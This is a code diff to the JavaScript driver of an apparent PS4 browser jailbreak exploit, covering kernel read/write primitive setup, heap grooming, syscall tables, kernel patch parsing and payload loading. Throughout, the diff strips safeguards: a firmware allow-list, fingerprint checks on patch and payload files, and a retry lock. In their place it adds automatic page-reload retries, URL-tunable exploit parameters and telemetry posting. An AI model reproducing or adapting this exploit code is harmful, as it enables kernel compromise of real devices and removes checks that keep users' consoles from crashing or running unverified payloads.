@@ -1,12 +1,14 @@
-import { establishPrimitive } from "./core.js?v=37";
-import { installWindowP, pairStatus } from "./mem.js?v=37";
-import { int64 } from "./int64.js?v=37";
-import { offsetsFor } from "./ps4_offsets.js?v=37";
+import { establishPrimitive } from "./core.js?v=10";
+import { installWindowP, pairStatus } from "./mem.js";
+import { int64 } from "./int64.js";
+import { offsetsFor } from "./ps4_offsets.js";
 
 try {
+  if (typeof window.__RAWGAME_DIAG_EVENT === "function") {
+    window.__RAWGAME_DIAG_EVENT("execution", "execution.module-script-enter", "");
+  }
   window.__RAWGAME_MODULE_BOOTED = true;
   window.__RAWGAME_LAST_PROGRESS = Date.now();
-  if (window.__PS4_DIAG_EVENT) window.__PS4_DIAG_EVENT("execution.module-booted");
   if (typeof window.__RAWGAME_CLEAR_WATCHDOG === "function") window.__RAWGAME_CLEAR_WATCHDOG();
   if (document.body && document.body.className === "fail" && !window.__RAWGAME_EXECUTION_FINISHED) {
     document.body.className = "";
@@ -15,22 +17,38 @@ try {
   }
 } catch (e) {}
 
+try {
+  if (typeof window.__RAWGAME_DIAG_EVENT === "function") {
+    window.__RAWGAME_DIAG_EVENT("execution", "execution.module-initialized", "");
+  }
+} catch (e) {}
 const outEl = document.getElementById("out");
 const stateEl = document.getElementById("state");
 const lines = [];
 let passCount = 0,
   failCount = 0;
 let armedEver = false;
-let primitiveStarted = false;
-const incomingParams = new URLSearchParams(location.search);
-const params = new URLSearchParams();
-// Only local log display switches are accepted. Exploit tuning query values
-// are ignored so copied or stale links cannot silently alter a run.
-["log", "verbose"].forEach((key) => {
-  if (incomingParams.get(key) === "1") params.set(key, "1");
-});
-const STOP_BEFORE_DOUBLE = false;
+const params = new URLSearchParams(location.search);
+const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";
+
 const VERBOSE = params.get("verbose") === "1";
+const TELEMETRY = VERBOSE || params.get("log") === "1" || params.get("telemetry") === "1";
+
+function post(tag, detail) {
+  if (!TELEMETRY || navigator.onLine === false) return;
+  try {
+    const x = new XMLHttpRequest();
+    x.open("POST", "/t", true);
+    x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    x.timeout = 700;
+    x.send(
+      "PS4-JB&tag=" +
+        encodeURIComponent(tag) +
+        "&detail=" +
+        encodeURIComponent(String(detail == null ? "" : detail)),
+    );
+  } catch (e) {}
+}
 
 const PROSE = [
   / -- /,
@@ -59,90 +77,36 @@ function finishUI(result) {
   try {
     window.__RAWGAME_EXECUTION_FINISHED = true;
     window.__RAWGAME_EXECUTION_RESULT = result;
-    if (typeof window.__PS4_DIAG_FINISH === "function") window.__PS4_DIAG_FINISH(result);
     if (typeof window.__RAWGAME_CLEAR_WATCHDOG === "function") window.__RAWGAME_CLEAR_WATCHDOG();
   } catch (e) {}
-  if (!document.body) return;
+  if (SHOW_LOG || !document.body) return;
   const m = document.getElementById("msg");
   const p = result && result.payloadRunning;
   const k = result && result.kpatched;
   const jb = result && result.jailbroken;
   const done = !!(result && result.allDone);
-  const complete = !!(p && k && jb && done);
-  let failureStage = "";
-  try {
-    const diagnostic = typeof window.__PS4_DIAG_REPORT === "function"
-      ? window.__PS4_DIAG_REPORT()
-      : null;
-    const events = diagnostic && Array.isArray(diagnostic.events)
-      ? diagnostic.events
-      : [];
-    for (let i = events.length - 1; i >= 0; i--) {
-      const match = /^failure\.([A-Za-z0-9_.:-]{1,60})$/.exec(events[i] && events[i].event || "");
-      if (match) {
-        failureStage = match[1];
-        break;
-      }
-    }
-  } catch (e) {}
-  state(
-    complete
-      ? "اكتمل تفعيل الجلبريك"
-      : k && jb && done
-        ? "اكتملت التعديلات؛ الحمولة غير مؤكدة"
-        : "لم يكتمل التفعيل",
-    complete ? "ok" : k && jb && done ? "warn" : "bad",
-  );
-  const phaseLabel = document.getElementById("phaseText");
-  if (phaseLabel) phaseLabel.textContent = complete ? "مكتمل" : k && jb && done ? "نتيجة جزئية" : "توقف";
   if (m) {
-    m.textContent = complete
-      ? "اكتمل التفعيل بنجاح"
+    m.textContent = p && k && jb && done
+      ? "DONE"
       : k && jb && done
-        ? "اكتملت التعديلات؛ لم يتم تأكيد تشغيل الحمولة"
-        : primitiveStarted
-          ? "لم يكتمل التفعيل؛ أعد تشغيل الجهاز قبل محاولة أخرى"
-          : "توقفت العملية قبل بدء الاستغلال؛ راجع توافق الإصدار والملفات";
-    if (!complete && failureStage) m.textContent += " · رمز مرحلة الفشل: " + failureStage;
-    m.setAttribute("role", complete ? "status" : "alert");
-    m.style.display = "block";
+        ? "KERNEL / PATCH COMPLETE — PAYLOAD NOT CONFIRMED"
+        : armedEver
+          ? "RESTART YOUR CONSOLE"
+          : "REFRESH THE PAGE AND RUN AGAIN";
+    m.setAttribute("role", p && k && jb && done ? "status" : "alert");
   }
-  const retryButton = document.getElementById("retry");
-  if (retryButton) retryButton.hidden = true;
-  const returnLauncher = document.getElementById("returnLauncher");
-  if (returnLauncher) returnLauncher.hidden = false;
-  if (SHOW_LOG) return;
-  document.body.className = complete ? "done" : "fail";
+  document.body.className = p && k && jb && done ? "done" : "fail";
 }
 function mark(tag, detail) {
-  try { window.__RAWGAME_LAST_PROGRESS = Date.now(); } catch (e) {}
-  try { if (window.__PS4_DIAG_EVENT) window.__PS4_DIAG_EVENT(tag, detail); } catch (e) {}
-  if (tag === "PROOF-FAIL" && typeof detail === "string") {
-    const failedCheck = /^([A-Za-z0-9_.:-]{1,60})(?:\s|$)/.exec(detail);
-    if (failedCheck) {
-      try {
-        if (window.__PS4_DIAG_EVENT) window.__PS4_DIAG_EVENT("failure." + failedCheck[1], detail);
-      } catch (e) {}
+  try {
+    window.__RAWGAME_LAST_PROGRESS = Date.now();
+    if (typeof window.__RAWGAME_DIAG_EVENT === "function") {
+      window.__RAWGAME_DIAG_EVENT("execution", tag, detail == null ? "" : String(detail));
     }
-  }
-  if (!window.__RAWGAME_EXECUTION_FINISHED && stateEl) {
-    const phase = String(tag || "");
-    let live = "";
-    if (/FAIL|ERROR|THREW|ABORT|GIVEUP|MISS/i.test(phase)) live = "سُجل تعذر في خطوة؛ يجري إنهاء الفحص بأمان";
-    else if (/PAYLOAD|GOLDHEN|PTHREAD/i.test(phase)) live = "تجهيز وتشغيل الحمولة";
-    else if (/KPATCH|PATCH/i.test(phase)) live = "تطبيق تعديلات النظام";
-    else if (/JB-|JAIL|PRISON|ROOTVNODE/i.test(phase)) live = "فحص صلاحيات النظام";
-    else if (/BASE|GADGET|STUB|SYSCALL|KRW/i.test(phase)) live = "فحص مكونات بيئة النظام";
-    else if (/PRIMITIVE|PAIR|PIN|LEAK|REAP|GROOM|AIO|SSV|CROSS/i.test(phase)) live = "تهيئة الذاكرة وتجهيز التنفيذ";
-    if (live) {
-      stateEl.textContent = live;
-      stateEl.className = "state-value warn";
-      const livePhase = document.getElementById("phaseText");
-      if (livePhase) livePhase.textContent = "قيد التنفيذ";
-    }
-  }
+  } catch (e) {}
   const raw = detail;
   if (!SHOW_LOG) {
+    if (TELEMETRY) post(tag, raw);
     return;
   }
   detail = terse(detail);
@@ -166,20 +130,17 @@ function mark(tag, detail) {
     while (outEl.childNodes.length > 512) outEl.removeChild(outEl.firstChild);
     outEl.scrollTop = outEl.scrollHeight;
   }
+  if (TELEMETRY) post(tag, raw);
 }
 
 function trace(tag, detail) {
   if (VERBOSE) mark(tag, detail);
-  else {
-    try { if (window.__PS4_DIAG_EVENT) window.__PS4_DIAG_EVENT(tag, detail); } catch (e) {}
-  }
+  else if (TELEMETRY) post(tag, detail);
 }
 function state(t, c) {
-  if (!stateEl) return;
+  if (!SHOW_LOG || !stateEl) return;
   stateEl.textContent = t;
-  stateEl.className = "state-value " + (c || "");
-  const phaseEl = document.getElementById("phaseText");
-  if (phaseEl) phaseEl.textContent = c === "bad" ? "توقف" : c === "warn" ? "قيد التنفيذ" : "مكتمل";
+  stateEl.className = c || "";
 }
 function check(name, ok, detail) {
   if (ok) {
@@ -192,22 +153,7 @@ function check(name, ok, detail) {
   return ok;
 }
 
-const EXPECTED_ASSET_FINGERPRINTS = {
-  "patches/1302.bin": "439d1d18",
-  "patches/1350.bin": "e6bdd190",
-  "patches/1352.bin": "af292d9a",
-  "payload2.bin": "2c4a6ae9",
-  "goldhen.bin": "2c4a6ae9",
-};
-function assetFingerprint(bytes) {
-  let hash = 0x811c9dc5;
-  for (let i = 0; i < bytes.length; i++)
-    hash = Math.imul(hash ^ bytes[i], 0x01000193) >>> 0;
-  return hash.toString(16).padStart(8, "0");
-}
-
 const SYS = {
-  open: 5,
   getpid: 20,
   getuid: 0x18,
   close: 6,
@@ -255,13 +201,8 @@ let allDone = false,
     const { key, off } = offsetsFor(navigator.userAgent);
     mark("BUILD", "jb=skipjb2 base=ef1670a");
     mark("FW", key || "(not a PS4 UA)");
-    if (key !== "13.02" && key !== "13.04" && key !== "13.50" && key !== "13.52") {
-      check("firmware-profile-present", false, "blocked fw=" + (key || "unknown") + " stage=pre-primitive");
-      state("ملفات هذا الإصدار غير مفعّلة", "bad");
-      return;
-    }
     if (!off) {
-      state("لا توجد offsets لهذا الإصدار", "bad");
+      state("no offsets for this firmware", "bad");
       return;
     }
     const fwKey = key || "unknown";
@@ -304,39 +245,6 @@ let allDone = false,
     const KPATCH_FILE =
       "patches/" + (off.kpatch || fwKey.replace(".", "") + ".bin");
     const PAYLOAD_FILE = off.payload || "payload.bin";
-    let preflightKpatch = null;
-    let preflightPayload = null;
-    if (DO_PATCH) {
-      try {
-        const response = await fetch(KPATCH_FILE);
-        if (response.ok) preflightKpatch = new Uint8Array(await response.arrayBuffer());
-      } catch (e) {
-        mark("KPATCH-PREFLIGHT-THREW", (e && e.message) || String(e));
-      }
-      let patchSites = 0;
-      if (preflightKpatch) {
-        for (let i = 0; i + 7 <= preflightKpatch.length; i++)
-          if (preflightKpatch[i] === 0xc6 && preflightKpatch[i + 1] === 0x81 && preflightKpatch[i + 6] === 0xeb) patchSites++;
-      }
-      const patchFingerprint = preflightKpatch ? assetFingerprint(preflightKpatch) : "missing";
-      const expectedPatchFingerprint = EXPECTED_ASSET_FINGERPRINTS[KPATCH_FILE];
-      if (!check("kpatch-file-preflight", !!preflightKpatch && preflightKpatch.length === 632 && patchSites === 10 && patchFingerprint === expectedPatchFingerprint,
-        "file=" + KPATCH_FILE + " bytes=" + (preflightKpatch ? preflightKpatch.length : 0) + " sites=" + patchSites + " fnv1a=" + patchFingerprint + " stage=pre-primitive"))
-        return;
-    }
-    if (DO_PAYLOAD) {
-      try {
-        const response = await fetch(PAYLOAD_FILE);
-        if (response.ok) preflightPayload = new Uint8Array(await response.arrayBuffer());
-      } catch (e) {
-        mark("PAYLOAD-PREFLIGHT-THREW", (e && e.message) || String(e));
-      }
-      const payloadFingerprint = preflightPayload ? assetFingerprint(preflightPayload) : "missing";
-      const expectedPayloadFingerprint = EXPECTED_ASSET_FINGERPRINTS[PAYLOAD_FILE];
-      if (!check("payload-file-preflight", !!preflightPayload && preflightPayload.length === 293120 && preflightPayload[0] === 0xe9 && payloadFingerprint === expectedPayloadFingerprint,
-        "file=" + PAYLOAD_FILE + " bytes=" + (preflightPayload ? preflightPayload.length : 0) + " fnv1a=" + payloadFingerprint + " stage=pre-primitive"))
-        return;
-    }
     const needPatch = ["k_sysent_661", "k_jmp_rsi"].filter(
       (k) => off[k] === undefined,
     );
@@ -379,21 +287,72 @@ let allDone = false,
         " src=ps4_offsets.js",
     );
 
-    // Automatic exploit retries are disabled in the safety build. A failed
-    // attempt returns to the result screen and requires a console restart.
-    try { sessionStorage.removeItem("jb1352-read-retry"); } catch (e) {}
-    const retryBenign = (why) => {
-      mark("RETRY-DISABLED", "why=" + why + " automatic-reload=0");
-      return false;
+    // ---- benign-miss auto-retry (reads only, before any kernel write) ----
+    // A passA/passB "no crossing" is a recoverable reclaim miss in the READ
+    // phase -- no kernel .data/.text has been touched yet, so reloading and
+    // retrying is safe. The counter lives in sessionStorage so it survives
+    // the reload and is cleared the moment the read phase succeeds, so a
+    // later manual run always starts fresh. NEVER call retryBenign() after a
+    // kernel write: a reload would re-enter with the kernel already modified.
+    // A hard KP (a total reclaim miss that faults inside the cancel walk)
+    // cannot be caught here and still needs a reboot -- this only recovers
+    // the benign, detectable misses.
+    const retryArg = parseInt(params.get("retry") || "", 10);
+    const RETRY_MAX = Number.isFinite(retryArg) && retryArg >= 0 ? retryArg : 4;
+    const RETRY_KEY = "jb1352-read-retry";
+    const retryCount = () => {
+      try {
+        const v = parseInt(sessionStorage.getItem(RETRY_KEY) || "0", 10);
+        return Number.isFinite(v) && v > 0 ? v : 0;
+      } catch (e) {
+        return 0;
+      }
     };
+    const clearRetry = () => {
+      try {
+        sessionStorage.removeItem(RETRY_KEY);
+      } catch (e) {}
+    };
+    const retryBenign = (why) => {
+      const n = retryCount();
+      if (n >= RETRY_MAX) {
+        mark(
+          "AUTO-RELOAD-GIVEUP",
+          "why=" + why + " reloads=" + n + " -- reboot and try again",
+        );
+        return false;
+      }
+      let stored = -1;
+      try {
+        sessionStorage.setItem(RETRY_KEY, String(n + 1));
+        stored = parseInt(sessionStorage.getItem(RETRY_KEY) || "-1", 10);
+      } catch (e) {
+        stored = -1;
+      }
+      if (stored !== n + 1) {
+        mark(
+          "AUTO-RELOAD-NO-STORAGE",
+          "why=" + why + " wrote=" + (n + 1) + " read=" + stored,
+        );
+        return false;
+      }
+      mark("AUTO-RELOAD", "why=" + why + " reload=" + (n + 1) + "/" + RETRY_MAX);
+      setTimeout(() => {
+        try {
+          location.reload();
+        } catch (e) {}
+      }, 400);
+      return true;
+    };
+    if (retryCount() > 0)
+      mark("AUTO-RELOAD-RESUME", "reload=" + retryCount() + "/" + RETRY_MAX);
 
-    state("تهيئة محرك التنفيذ…", "warn");
+    state("running the primitive...", "warn");
     await new Promise((r) => setTimeout(r, 0));
 
     const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
-    primitiveStarted = true;
     const carrier = await establishPrimitive({
-      maxAttempts: 1,
+      maxAttempts: 6,
       onEvent: (t, d, a) =>
         (PRIMITIVE_LOUD.test(t) ? mark : trace)(
           t,
@@ -627,7 +586,11 @@ let allDone = false,
       return a.hi === 0 && a.low === 0 ? -1 : p.read4(a) | 0;
     }
     async function relaunchPayload() {
-      const blob = preflightPayload;
+      let blob = null;
+      try {
+        const r = await fetch(PAYLOAD_FILE);
+        if (r.ok) blob = new Uint8Array(await r.arrayBuffer());
+      } catch (e) {}
       if (!blob || blob[0] !== 0xe9) {
         mark("JB-RELAUNCH", "file=" + PAYLOAD_FILE + " blob=unusable");
         return;
@@ -678,91 +641,6 @@ let allDone = false,
           " handle=" +
           handle,
       );
-    }
-
-    function asciiBuffer(text) {
-      text = String(text == null ? "" : text);
-      const ab = new ArrayBuffer(text.length + 1);
-      const u8 = new Uint8Array(ab);
-      for (let i = 0; i < text.length; i++) u8[i] = text.charCodeAt(i) & 0xff;
-      u8[text.length] = 0;
-      return ab;
-    }
-
-    function exportDiagnosticToUsb(result) {
-      if (!result || !p || !stubAddr.has(SYS.open) || !stubAddr.has(SYS.write)) return;
-      const destinations = [
-        "/mnt/usb0/PS4-STABILITY-DIAGNOSTIC.txt",
-        "/mnt/usb1/PS4-STABILITY-DIAGNOSTIC.txt",
-        "/data/PS4-STABILITY-DIAGNOSTIC.txt",
-        "/user/data/PS4-STABILITY-DIAGNOSTIC.txt",
-      ];
-      const results = [];
-      function makeText(storageResults) {
-        const diagnostic = typeof window.__PS4_DIAG_REPORT === "function" ? window.__PS4_DIAG_REPORT() : null;
-        const payload = {
-          schemaVersion: 2,
-          buildVersion: "14.7.0",
-          firmware: fwKey,
-          savedAt: new Date().toISOString(),
-          result: result,
-          events: diagnostic && Array.isArray(diagnostic.events) ? diagnostic.events.slice(-240) : [],
-          storage: storageResults,
-        };
-        return JSON.stringify(payload, null, 2) + "\n";
-      }
-      function tryWrite(path, text) {
-        const pathAb = asciiBuffer(path); keepAlive.push(pathAb);
-        const reportAb = asciiBuffer(text); keepAlive.push(reportAb);
-        const fd = sc(SYS.open, bufAddr(pathAb), 0x601, 0x1b6).i32;
-        if (fd < 0) {
-          return {path:path,ok:false,stage:"open",errno:errno()};
-        }
-        let offw = 0, ok = true, err = 0;
-        try {
-          const reportPtr = bufAddr(reportAb);
-          while (offw < reportAb.byteLength) {
-            const n = sc(SYS.write, fd, reportPtr.add32(offw), reportAb.byteLength - offw).i32;
-            if (n <= 0) { ok = false; err = errno(); break; }
-            offw += n;
-          }
-        } catch (e) {
-          ok = false; err = -1;
-        }
-        try { sc(SYS.close, fd); } catch (e) {}
-        return {path:path,ok:ok&&offw===reportAb.byteLength,stage:ok?"write":"write",bytes:offw,expected:reportAb.byteLength,errno:err};
-      }
-      try {
-        const draft = makeText([]);
-        for (const path of destinations) {
-          const r = tryWrite(path, draft);
-          results.push(r);
-          if (r.ok) {
-            try { localStorage.setItem("ps4-stability-usb-report-path", path); } catch (e) {}
-          }
-        }
-        const finalText = makeText(results);
-        const okPaths = [];
-        for (const r of results) {
-          if (!r.ok) continue;
-          const rr = tryWrite(r.path, finalText);
-          r.finalOk = rr.ok;
-          r.finalBytes = rr.bytes;
-          if (rr.ok) okPaths.push(r.path);
-        }
-        if (typeof window.__PS4_DIAG_SET_STORAGE === "function") {
-          try { window.__PS4_DIAG_SET_STORAGE(results); } catch (e) {}
-        }
-        try { localStorage.setItem("ps4-stability-diagnostic-paths-v2", JSON.stringify(results)); } catch (e) {}
-        if (okPaths.length) {
-          window.__RAWGAME_USB_REPORT_SAVED = okPaths[0];
-          mark("REPORT-SAVED", okPaths.join(","));
-        } else {
-          mark("NO-STORAGE", results.map(r => r.path + ":" + (r.stage||"?") + ":errno=" + (r.errno == null ? "?" : r.errno)).join(" | "));
-        }
-      } catch (e) {
-        mark("USB-REPORT-THREW", (e && e.message) || String(e));
-      }
     }
 
     const pid = sc(SYS.getpid).i32;
@@ -1818,6 +1696,25 @@ let allDone = false,
       for (let k = 0; k < NUM; k++)
         sts += (k ? "," : "") + (stDv2.getUint32(k * 4, true) >>> 0).toString(16);
       reapAt = Date.now();
+      post(
+        "REAP",
+        tag +
+          " gen=" +
+          reapedGen +
+          " cancel=" +
+          c +
+          " poll=" +
+          p +
+          " delete=" +
+          d +
+          " c=[" +
+          stsC +
+          "] p=[" +
+          stsP +
+          "] st=[" +
+          sts +
+          "]",
+      );
     }
 
     const firesArg = parseInt(params.get("fires") || "", 10);
@@ -2109,7 +2006,9 @@ let allDone = false,
         (((W0 >>> 0) & 7) === 0),
     );
     // Read phase is done: the remaining armings (anchor, caps) touch the
-    // kernel. This build never reloads an attempt automatically.
+    // kernel, so from here a failure must NOT auto-reload. Reset the counter
+    // so the next manual run starts fresh.
+    clearRetry();
 
     const IDT = new int64(0x00001a00, 0xffffff80);
     const GATE_SZ = 16;
@@ -3132,40 +3031,58 @@ let allDone = false,
             let jbSaved = null,
               jbRestored = false;
 
-            let kpatchBlob = preflightKpatch,
-              payloadBlob = preflightPayload;
+            let kpatchBlob = null,
+              payloadBlob = null;
             const SITES = [];
             if (DO_PATCH) {
-              for (let i = 0; i + 7 <= kpatchBlob.length; i++) {
-                if (kpatchBlob[i] !== 0xc6 || kpatchBlob[i + 1] !== 0x81)
-                  continue;
-                if (kpatchBlob[i + 6] !== 0xeb) continue;
-                SITES.push(
-                  (kpatchBlob[i + 2] |
-                    (kpatchBlob[i + 3] << 8) |
-                    (kpatchBlob[i + 4] << 16) |
-                    (kpatchBlob[i + 5] << 24)) >>>
-                    0,
-                );
+              try {
+                const r = await fetch(KPATCH_FILE);
+                if (r.ok) kpatchBlob = new Uint8Array(await r.arrayBuffer());
+              } catch (e) {
+                mark("KPATCH-FETCH-THREW", (e && e.message) || String(e));
               }
+              if (kpatchBlob)
+                for (let i = 0; i + 7 <= kpatchBlob.length; i++) {
+                  if (kpatchBlob[i] !== 0xc6 || kpatchBlob[i + 1] !== 0x81)
+                    continue;
+                  if (kpatchBlob[i + 6] !== 0xeb) continue;
+                  SITES.push(
+                    (kpatchBlob[i + 2] |
+                      (kpatchBlob[i + 3] << 8) |
+                      (kpatchBlob[i + 4] << 16) |
+                      (kpatchBlob[i + 5] << 24)) >>>
+                      0,
+                  );
+                }
               mark(
                 "KPATCH-BLOB",
                 "file=" +
                   KPATCH_FILE +
                   " bytes=" +
-                  kpatchBlob.length +
+                  (kpatchBlob ? kpatchBlob.length : 0) +
                   " sites=" +
                   SITES.length,
               );
             }
             if (DO_PAYLOAD) {
+              try {
+                const r = await fetch(PAYLOAD_FILE);
+                if (r.ok) payloadBlob = new Uint8Array(await r.arrayBuffer());
+              } catch (e) {
+                mark("PAYLOAD-FETCH-THREW", (e && e.message) || String(e));
+              }
               mark(
                 "PAYLOAD-BLOB",
                 "file=" +
                   PAYLOAD_FILE +
                   " bytes=" +
-                  payloadBlob.length +
-                  " head=e9-ok",
+                  (payloadBlob ? payloadBlob.length : 0) +
+                  " head=" +
+                  (payloadBlob
+                    ? payloadBlob[0] === 0xe9
+                      ? "e9-ok"
+                      : "NOT-e9"
+                    : "none"),
               );
             }
 
@@ -3735,10 +3652,6 @@ let allDone = false,
                 "  (.data/.text/caps need a reboot; the refcounted handles do not)",
             );
             allDone = true;
-            if (jbDone && kpDone && plDone) {
-              try { sessionStorage.setItem("ps4-auto-success-session-v1", "1"); } catch (e) {}
-              try { if (window.__PS4_DIAG_EVENT) window.__PS4_DIAG_EVENT("activation.confirmed", "jailbroken=1 kpatched=1 payload_running=1"); } catch (e) {}
-            }
           }
         }
       }
@@ -3865,10 +3778,6 @@ let allDone = false,
       );
     }
     allDone = true;
-    if (jailbroken && kpatched && payloadRunning) {
-      try { sessionStorage.setItem("ps4-auto-success-session-v1", "1"); } catch (e) {}
-      try { if (window.__PS4_DIAG_EVENT) window.__PS4_DIAG_EVENT("activation.confirmed", "jailbroken=1 kpatched=1 payload_running=1 final"); } catch (e) {}
-    }
 
     reapNow("final a=" + armCount);
     setNode0(0, N0SINK);
@@ -3957,14 +3866,8 @@ let allDone = false,
     }
   } catch (e) {
     mark("THREW", e && e.message ? e.message : String(e));
-    state("حدث خطأ أثناء التنفيذ", "bad");
+    state("threw", "bad");
   } finally {
-    let finalResult = null;
-    try {
-      finalResult = {allDone:!!allDone,jailbroken:!!jailbroken,kpatched:!!kpatched,payloadRunning:!!payloadRunning,passCount:passCount,failCount:failCount};
-      try { if (typeof window.__PS4_DIAG_FINISH === "function") window.__PS4_DIAG_FINISH(finalResult); } catch (eDiag) {}
-      try { exportDiagnosticToUsb(finalResult); } catch (eUsb) {}
-    } catch (eResult) {}
     try {
       if (jbRestoreHook) jbRestoreHook("finally");
     } catch (e5) {
@@ -4006,7 +3909,7 @@ let allDone = false,
         (allDone ? "" : "  INCOMPLETE"),
     );
     try {
-      const result = finalResult || {
+      const result = {
         allDone: !!allDone,
         jailbroken: !!jailbroken,
         kpatched: !!kpatched,
@@ -4014,6 +3917,12 @@ let allDone = false,
         passCount: passCount,
         failCount: failCount,
       };
+      try {
+        if (typeof window.__RAWGAME_DIAG_EVENT === "function") {
+          window.__RAWGAME_DIAG_EVENT("execution", "execution.result", JSON.stringify(result));
+          window.__RAWGAME_DIAG_FINALIZE = true;
+        }
+      } catch (eDiag) {}
       try { window.__RAWGAME_EXECUTION_RESULT = result; } catch (eResult) {}
       finishUI(result);
     } catch (eUI) {}
